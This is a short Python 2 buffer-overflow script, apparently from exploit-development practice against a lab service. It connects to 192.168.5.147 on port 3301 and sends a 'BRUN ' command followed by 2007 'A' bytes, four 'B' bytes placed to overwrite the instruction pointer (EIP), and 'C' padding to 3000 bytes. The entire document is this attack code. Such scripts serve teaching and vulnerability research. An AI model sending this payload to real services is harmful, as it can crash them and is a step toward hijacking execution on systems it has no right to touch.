import socket
import sys

data1 = 'A' * 2007
eip = 'B' * 4
data2 = 'C' * (3000 - len(data1) - len(eip))
buffer = data1 + eip + data2
command = 'BRUN '
data = command + buffer

print '[*] Sending data: ' + data
s = socket.create_connection(('192.168.5.147',3301))
s.sendall(data)
s.close()
